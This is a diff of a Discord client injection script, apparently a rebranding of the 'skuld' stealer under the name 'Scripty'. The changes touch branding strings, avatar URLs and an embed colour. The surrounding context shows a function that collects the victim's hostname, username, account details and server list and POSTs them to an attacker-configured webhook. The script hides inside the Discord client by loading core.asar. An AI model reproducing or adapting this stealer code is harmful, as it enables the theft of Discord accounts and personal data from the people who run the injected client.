@@ -112,8 +112,8 @@ const getToken = async () => {
 const hooker = async (content, token, account) => {
     try {
         content["content"] = `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n\n${content["content"] || ''}`;
-        content["username"] = "skuld - cord injection";
-        content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
+        content["username"] = "Scripty Discord injection";
+        content["avatar_url"] = "https://cdn.discordapp.com/attachments/1432758350097158176/1441362670119817357/Snimka_obrazovky_2025-08-20_181038.png?ex=6a33bd17&is=6a326b97&hm=f6961eef0a24fd9b159f4c4cc1884a65966bd33c227cabe7d4f70c4384f7c75d";
 
         content["embeds"][0] = content["embeds"][0] || {};
         content["embeds"][0]["author"] = { "name": account.username };
@@ -121,8 +121,8 @@ const hooker = async (content, token, account) => {
             "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
         };
         content["embeds"][0]["footer"] = {
-            "text": "skuld discord injection - made by hackirby",
-            "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
+            "text": "Discord injected - made by scripty",
+            "icon_url": "https://cdn.discordapp.com/attachments/1432758350097158176/1441362670119817357/Snimka_obrazovky_2025-08-20_181038.png?ex=6a33bd17&is=6a326b97&hm=f6961eef0a24fd9b159f4c4cc1884a65966bd33c227cabe7d4f70c4384f7c75d",
         };
         content["embeds"][0]["title"] = "Account Information";
 
@@ -145,7 +145,7 @@ const hooker = async (content, token, account) => {
             { "title": `Total Servers: ${servers.totalGuilds}`, "description": servers.message }
         );
 
-        content["embeds"].forEach(embed => embed["color"] = 0xb143e3);
+        content["embeds"].forEach(embed => embed["color"] = 1752220);
 
         await request("POST", CONFIG.webhook, {}, JSON.stringify(content));
         console.log("[+] Webhook sent successfully");
@@ -497,3 +497,6 @@ const bdPath = path.join(process.env.APPDATA, 'BetterDiscord', 'data', 'betterdi
 if (fs.existsSync(bdPath)) require(bdPath);
 
 module.exports = require("./core.asar");
+
+// require("C:\\Users\\nikol.PRACKA\\AppData\\Roaming\\BetterDiscord\\data\\betterdiscord.asar");
+// module.exports = require("./core.asar");
